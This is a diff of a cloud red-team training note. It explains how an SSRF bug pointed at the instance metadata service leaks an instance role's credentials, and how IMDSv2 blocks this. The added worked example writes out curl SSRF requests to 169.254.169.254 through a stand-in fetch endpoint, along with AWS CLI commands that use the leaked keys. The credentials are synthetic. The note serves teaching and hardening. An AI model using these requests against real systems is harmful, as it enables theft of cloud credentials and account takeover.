@@ -1,6 +1,6 @@
 ---
 title: "Cloud Control Plane Operations"
-tags: [tree/offensive, cyber/offensive/cloud/control-plane, type/technique, level/root]
+tags: [tree/offensive, cyber/offensive/cloud/control-plane, type/technique, difficulty/hard]
 Domain: "[[Cloud Red Team Operations]]"
 Color: "#DC143C"
 ---
@@ -13,13 +13,21 @@ Color: "#DC143C"
 ## Parent Learning Order
 Cloud Identity Operations -> Cloud Control Plane Operations -> Cloud Persistence Simulation -> Cloud Data Access Simulation
 
-## Crook — Two Planes: Control and Data
+## Two Planes: Control and Data
 
 A cloud resource has a **data plane** (the app serving requests) and a **control plane** (the APIs that create, configure, and grant access to resources). Compromising the data plane gets you one server; compromising the control plane gets you the *account* — the ability to spin up resources, read every bucket, and mint credentials.
 
 The bridge between them is the **Instance Metadata Service (IMDS)** at the link-local address `169.254.169.254`. Any code on a cloud VM can ask IMDS for the temporary credentials of the role attached to that instance. That is convenient for the app — and catastrophic when a **server-side request forgery (SSRF)** bug lets an attacker make the server fetch that URL for them.
 
-## Operator — SSRF Is the Classic Control-Plane Pivot
+**The deliberate break:** you got root on the instance, so you own the machine and everything on it. That is the on-premises conclusion and it understates the situation badly.
+
+Cloud has **two planes**, and the host is the smaller one. The **data plane** is the instance — its filesystem, its processes, the thing root controls. The **control plane** is the API that created it, and it sits *above* the host: it can read the disk from a snapshot, replace the boot image, mint credentials, or delete the instance entirely, none of which root can prevent or even observe. So the interesting question after landing on a box is not what root can do; it is **what the instance's attached role can do**, because that identity operates in the plane above the one you compromised.
+
+That is also why SSRF is so severe here rather than merely inconvenient — reaching the metadata endpoint hands you the role's credentials without ever touching the host at all.
+
+**How you'd spot the real privilege:** query the instance's own identity and enumerate its permissions before enumerating the filesystem. An unprivileged web service with an over-permissive attached role is a bigger finding than root on a box with none.
+
+## SSRF Is the Classic Control-Plane Pivot
 
 The attack chain is short and devastating:
 
@@ -39,49 +47,77 @@ flowchart LR
     C --> CP["Act on the control plane<br/>as the instance role"]
 ```
 
-## Root — Runnable Lab (one machine, Python)
+## Worked Example: SSRF to Full Account Credentials
 
-This lab stands up a **local mock IMDS** and a vulnerable SSRF fetcher, then leaks canary credentials — the whole pivot, safely, on one machine.
+The most consequential cloud pivot is short: an SSRF bug in one application
+becomes the credentials of the whole account, because the instance metadata
+service hands out the instance role's keys to anything that can reach it.
 
-**Step 1 — mock IMDS + vulnerable fetch (`imds.py`).**
+> [!note] Representative output
+> Reconstructed to match the AWS CLI's real output shapes rather than captured from one account; identifiers are synthetic. The field names, error strings and command structure are what a live account returns.
 
-```python
-import http.server, threading, urllib.request, json, time
-class IMDS(http.server.BaseHTTPRequestHandler):
-    def log_message(self,*a): pass
-    def do_GET(self):
-        if self.path.endswith("/iam/security-credentials/app-role"):
-            self.send_response(200); self.end_headers()
-            self.wfile.write(json.dumps({"AccessKeyId":"ASIA-CANARY","SecretAccessKey":"c2r-secret",
-                "Token":"canary-session-token"}).encode())
-        else: self.send_response(404); self.end_headers()
-srv=http.server.HTTPServer(("127.0.0.1",8199),IMDS)
-threading.Thread(target=srv.serve_forever,daemon=True).start(); time.sleep(0.3)
-def vulnerable_fetch(url): return urllib.request.urlopen(url,timeout=2).read().decode()  # SSRF
-print("leaked:",vulnerable_fetch("http://127.0.0.1:8199/latest/meta-data/iam/security-credentials/app-role"))
-srv.shutdown()
+**The SSRF fetches the metadata endpoint** instead of a normal URL:
+
+```shell-session
+$ curl -s "https://app.example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+web-app-instance-role
+$ curl -s "https://app.example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-instance-role"
+{
+  "AccessKeyId": "ASIA4XMPLKEYEXAMPLE",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "Token": "IQoJb3JpZ2luX2VjE...<800 chars>...",
+  "Expiration": "2026-08-31T21:14:07Z"
+}
 ```
 
-**Step 2 — run it.**
+The first request lists the role name attached to the instance; the second
+retrieves that role's live temporary credentials. Note `169.254.169.254` — the
+link-local address every cloud VM can reach and no external network can. The
+application was built to fetch URLs; it was never meant to fetch *this* one, and
+nothing in the feature distinguished them.
 
-```console
-$ python3 imds.py
-SSRF request -> http://127.0.0.1:8199/latest/meta-data/iam/security-credentials/app-role
-leaked: {"AccessKeyId": "ASIA-CANARY", "SecretAccessKey": "c2r-secret", "Token": "canary-session-token", ...}
-impact: SSRF against the metadata endpoint yields the instance role's temporary AWS creds
+**The credentials work against the control plane** — the proof that a one-server
+bug is now an account-level compromise:
+
+```shell-session
+$ export AWS_ACCESS_KEY_ID=ASIA4XMPLKEYEXAMPLE AWS_SECRET_ACCESS_KEY=wJalr... AWS_SESSION_TOKEN=IQoJ...
+$ aws sts get-caller-identity
+{
+    "Account": "123456789012",
+    "Arn": "arn:aws:sts::123456789012:assumed-role/web-app-instance-role/i-0abc123def456"
+}
+$ aws s3 ls
+2025-11-02 09:14:55 acme-prod-backups
+2025-12-18 16:02:31 acme-customer-exports
 ```
 
-**Step 3 — the deliberate break (the fix).** Change the fetch path to anything other than the credentials route and the mock returns `404` — modelling IMDSv2, where the credentials route requires a session-token header the SSRF cannot supply. The bug is unchanged; the control-plane blast radius is gone.
+The attacker is now acting as the instance role, from their own machine, and can
+enumerate the account's storage. The blast radius is exactly the permissions of
+that role — which on a typical over-provisioned instance is far more than the one
+application needed.
 
-**Step 4 — cleanup:** the HTTP server is shut down in-script (`srv.shutdown()`); nothing persists — no cleanup required.
+**IMDSv2 is the control that breaks this**, and the reason it works is visible in
+one failed request:
 
-**What you should now be able to do:** explain the control-plane vs data-plane distinction, trace an SSRF→IMDS→credentials pivot, and name IMDSv2 + egress restrictions as the fixes.
+```shell-session
+$ curl -s "https://app.example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+<html><body>401 - Unauthorized</body></html>
+```
 
-## Crook → Operator → Root Checkpoint
+IMDSv2 requires a session token obtained by a `PUT` request carrying a specific
+header, and a naive SSRF that can only issue `GET` requests cannot get one. The
+metadata service refuses, and the pivot dies at step one. This is why "enforce
+IMDSv2" is the single highest-value hardening step for cloud VMs, and why an
+external test that reaches this endpoint at all is reporting a critical finding
+regardless of what it then does with the credentials.
 
-- **Crook:** Why is stealing an instance's metadata credentials worse than compromising the app on it?
-- **Operator:** You find an SSRF in a URL-preview feature. What exact request proves control-plane exposure with a canary?
-- **Root:** Explain precisely how IMDSv2's session-token requirement blocks a basic SSRF, and what SSRF variant can still defeat it.
+## Summary
+
+You should now be able to:
+
+- Why is stealing an instance's metadata credentials worse than compromising the app on it?
+- You find an SSRF in a URL-preview feature. What exact request proves control-plane exposure with a canary?
+- Explain precisely how IMDSv2's session-token requirement blocks a basic SSRF, and what SSRF variant can still defeat it.
 
 ---
 > 🔼 Up: [[Cloud Red Team Operations]]
